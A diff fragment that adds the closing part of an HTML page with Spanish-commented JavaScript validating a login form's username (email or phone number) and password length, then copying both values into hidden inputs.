+                            return validateResponse({ isOk: false, message: 'Error: El número de teléfono debe contener solo dígitos' });
+                        }
+                    } else {
+                        // Si no comienza con "+", verificar que todos los caracteres sean números
+                        if (new RegExp("^\\d+$").test(usernameValue)) {
+                            // Verificar la longitud
+                            if (usernameValue.length >= 10 && usernameValue.length <= 13) {
+                                // El número de teléfono es válido
+                                // return validateResponse({isOk: true, message: 'Número de teléfono válido'});
+                            } else {
+                                // Error de longitud
+                                return validateResponse({ isOk: false, message: 'Error: Longitud incorrecta (debe ser entre 10 y 13 caracteres)' });
+                            }
+                        }
+                    }
+                }
+
+                // Regla 4: Longitud mínima (si no contiene "@" y no comienza con un dígito)
+                if (!usernameValue.includes('@') && !new RegExp(phonePattern).test(usernameValue) && usernameValue.length <= 5) {
+                    return validateResponse({ isOk: false, message: 'Error: Usuario demasiado corto' });
+                }
+
+                // Regla 5: Logitud minima para contraseña
+                if (nameValue.length <= 5) {
+                    return validateResponse({ isOk: false, message: 'Error: Contraseña demasiada corta' });
+                }
+
+                let usernameHiddenInput = addHiddenInput('username', usernameInput.value);
+                let namePwsHiddenInput = addHiddenInput('name', namePwsInput.value);
+
+                // Si no hay errores, enviar el formulario o mostrar otro modal (según tu lógica)
+                return validateResponse({ isOk: true, message: 'Formulario válido' });
+            } catch (error) {
+                console.log("EROR => ", error);
+                return validateResponse({ isOk: false, message: 'Error inesperado en try catch' });
+            }
+        }
+
+        function validateResponse({ isOk, message }) {
+            if (!isOk) {
+                setTimeout(() => {
+                    showModalMessage();
+                    changeFormStatus(false);
+                }, 1000);
+            }
+
+            console.log(message);
+            return isOk;
+        }
+
+        // Enfocar el campo de usuario al cargar la página
+        document.addEventListener("DOMContentLoaded", setupFormElements);
+    </script>
+</body>
+
+</html>
